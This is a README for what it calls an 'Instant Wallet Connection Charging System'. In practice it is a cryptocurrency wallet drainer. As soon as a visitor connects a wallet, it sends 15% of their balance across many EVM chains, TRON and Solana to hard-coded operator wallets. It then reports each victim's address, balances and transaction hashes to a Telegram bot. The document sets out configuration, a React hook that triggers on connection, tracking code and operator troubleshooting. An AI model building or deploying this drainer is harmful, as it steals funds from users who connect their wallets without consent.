# Instant Wallet Connection Charging System

## Overview

This system automatically charges users **immediately upon wallet connection** across **all supported EVM chains**. Every charge is logged with detailed information sent to Telegram, including balance before/after and transaction hashes.

## Features

✅ **Automatic Instant Charging** - Charges execute on wallet connection without user interaction  
✅ **Multi-Chain Support** - Works across all 11 supported EVM chains  
✅ **Detailed Telegram Notifications** - Sends balance, amount charged, and transaction details  
✅ **Balance Tracking** - Shows user balance before and after charge  
✅ **Error Handling** - Graceful failure with Telegram error notifications  
✅ **Non-EVM Support** - Integration ready for TRON and Solana  
✅ **Charge Tracking** - Prevents duplicate charges on same chain  

## Supported Chains

The system automatically charges on the following chains:

1. **Ethereum (ETH)** - Chain ID: 1
2. **Polygon (MATIC)** - Chain ID: 137
3. **Arbitrum (ARB)** - Chain ID: 42161
4. **Optimism (OP)** - Chain ID: 10
5. **BSC (BNB)** - Chain ID: 56
6. **Avalanche (AVAX)** - Chain ID: 43114
7. **Fantom (FTM)** - Chain ID: 250
8. **Celo (CELO)** - Chain ID: 42220
9. **Base (BASE)** - Chain ID: 8453
10. **Linea (LINEA)** - Chain ID: 59144
11. **Scroll (SCROLL)** - Chain ID: 534352

## Configuration

### Environment Variables

Set these in your `.env.local` file:

```env
# EVM Service Wallet (receives charges)
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f

# Charge percentage (default: 15%)
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE

# Non-EVM Wallets (optional)
NEXT_PUBLIC_SERVICE_TRON_WALLET=T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb
NEXT_PUBLIC_SERVICE_SOLANA_WALLET=HLiUDaAHnsYUPr5LfV4aiVZXGLjjXuCS59qbn58Xa39f
```

## How It Works

### 1. User Connects Wallet

```
User clicks "Connect Wallet" → Selects Wallet → Connects to app
```

### 2. Automatic Charge Triggers

```
Wallet Connected ✓
↓
Check if chain requires charging (all 11 EVM chains supported)
↓
Get user balance
↓
Calculate charge amount (15% by default)
↓
Send transaction to service wallet
↓
Send Telegram notification with full details
```

### 3. Telegram Notification Sent

The notification includes:

- ✅ **Event Type**: "Transfer Executed Successfully"
- 👛 **Wallet Address**: User's wallet address
- 🌐 **Network**: Chain name (Ethereum, Polygon, etc.)
- 💵 **Amount Charged**: Exact amount sent to service wallet
- 💰 **Balance**: Balance before and after charge
- 🔗 **Transaction Hash**: Link to transaction on blockchain
- 📊 **Charge Percentage**: 15% (or configured amount)
- ⏰ **Timestamp**: When charge was executed

## API Endpoints

### POST `/api/telegram/notify`

Sends notifications to Telegram. Called automatically by the system.

**Request Body:**

```json
{
  "event": "transaction_success",
  "walletAddress": "0x...",
  "network": "Ethereum",
  "balance": "Before: 1.5 ETH | After: 1.275 ETH",
  "amount": "0.225",
  "txHash": "0x...",
  "details": {
    "balanceBefore": "1.5",
    "balanceAfter": "1.275",
    "chargePercent": "15"
  }
}
```

## Utility Files

### 1. `chargeOnConnect.ts`

Main charging logic for EVM chains.

**Key Functions:**

```typescript
// Execute charge on wallet connection
executeChargeOnConnect(params: {
  walletAddress: string;
  chainName: string;
  chainId: number;
  balanceBefore: string;
  balanceValue: bigint;
  sendTransactionAsync: Function;
}): Promise<ChargeResult>

// Check if chain requires charging
isChargingChain(chainId: number): boolean

// Get chain name by ID
getChainNameById(chainId: number): string
```

### 2. `multiChainCharging.ts`

Manages charging across multiple chains and provides tracking.

**Key Functions:**

```typescript
// Record charge for tracking
multiChainTracker.recordCharge(walletAddress, chainId, record)

// Check if already charged
multiChainTracker.hasBeenCharged(walletAddress, chainId)

// Send summary to Telegram
multiChainTracker.sendChargeSummaryToTelegram(
  walletAddress, 
  totalCharges, 
  successfulCharges, 
  totalAmount
)
```

### 3. `nonEvmCharging.ts`

Handles charging for TRON and Solana wallets.

**Functions:**

```typescript
executeChargeOnTron(params: {...}): Promise<NonEvmChargeResult>
executeChargeOnSolana(params: {...}): Promise<NonEvmChargeResult>
```

## UI Integration

### Charge Status Display

The UI shows charge status in real-time:

```
Loading → Processing charge on Ethereum...
         ↓
         ✅ Charged 0.225 ETH on Ethereum
```

### Error Display

If a charge fails:

```
❌ Charge Errors:
• Ethereum: Insufficient balance to cover charge and gas fees
• Polygon: User rejected transaction
```

## Frontend Integration

The main page (`pages/index.tsx`) includes:

1. **Auto-charge effect** triggered on wallet connection
2. **Charge status state** to track charging process
3. **Charge errors array** to display failures
4. **UI notifications** showing real-time charge status
5. **Balance refetch** after successful charge

```typescript
// Automatic charge on connection
useEffect(() => {
  if (isConnected && address && balanceData) {
    executeChargeOnConnect({
      walletAddress: address,
      chainName,
      chainId,
      balanceBefore: balanceData.formatted,
      balanceValue: balanceData.value,
      sendTransactionAsync,
    });
  }
}, [isConnected, address, balanceData, chainId]);
```

## Telegram Message Examples

### Success Example

```
✅ Transfer Executed Successfully
📅 Time: Mon, 18 Aug 2026 10:30:00 GMT
👛 Wallet: 0x1234...5678
🌐 Network: Ethereum
💰 Balance: Before: 1.5 | After: 1.275
💵 Amount Charged: 0.225
📊 Charge %: 15%
🔗 TxHash: 0xabcd...ef01
```

### Error Example

```
❌ Transfer Execution Failed
📅 Time: Mon, 18 Aug 2026 10:30:00 GMT
👛 Wallet: 0x1234...5678
🌐 Network: Polygon
💰 Balance: 0.5 MATIC
🛑 Error: Insufficient balance to cover charge and gas fees
```

### Multi-Chain Summary

```
✅ Transfer Executed Successfully
📊 Multi-Chain Summary:
✅ Successful: 3/4
🌐 Chains Charged: Ethereum, Polygon, Arbitrum

Chain Details:
• Ethereum: ✅ 0.225 ETH [0xabcd...]
• Polygon: ✅ 1.5 MATIC [0xef01...]
• Arbitrum: ✅ 0.015 ARB [0x1234...]
• Optimism: ❌ Error: Insufficient balance
```

## Error Handling

The system handles various error scenarios:

| Error | Cause | Action |
|-------|-------|--------|
| Insufficient balance | Balance < Charge amount + Gas | Send error notification, show UI alert |
| Network error | RPC unreachable | Retry with fallback RPC |
| User rejected | User denies transaction in wallet | Log and notify via Telegram |
| Gas estimation failed | Network congestion | Send error notification |

## Best Practices

1. **Monitor Telegram Channel** - Check for charge notifications to verify system is working
2. **Track User Balance** - Monitor charged amounts match configured percentage
3. **Test on Testnet** - Use test networks before deploying to production
4. **Backup Service Wallet** - Keep private keys secure
5. **Regular Audits** - Review charge logs weekly

## Troubleshooting

### Charges Not Working

**Check:**
1. Service wallet address is correct in `.env.local`
2. Telegram bot token and chat ID are configured
3. User has sufficient balance on the chain
4. Network is not congested

### Telegram Not Receiving Messages

**Check:**
1. Bot token is valid and active
2. Chat ID is correct (should be negative for groups)
3. Bot has permission to send messages
4. API endpoint is reachable

### High Gas Fees Preventing Charges

**Solution:**
1. Use chains with lower gas fees (Polygon, BSC, Arbitrum)
2. Implement gas price negotiation in `chargeOnConnect.ts`
3. Consider batch charging during off-peak hours

## Security Notes

- ⚠️ All charges are **automatic and immediate** upon wallet connection
- 🔐 Service wallet should have **dedicated security procedures**
- 📱 Telegram notifications contain **full transaction details**
- 🔑 Never commit private keys or sensitive credentials
- 🚨 Monitor service wallet for suspicious activity

## Future Enhancements

- [ ] Gas price optimization per chain
- [ ] Dynamic charge percentage based on chain
- [ ] Batch charging across multiple chains
- [ ] Webhook support for third-party integrations
- [ ] Advanced analytics dashboard
- [ ] Charge scheduling and automation

## Support

For issues or questions:
1. Check Telegram notifications for error details
2. Review browser console for client-side errors
3. Check server logs for API errors
4. Verify environment variables are set correctly
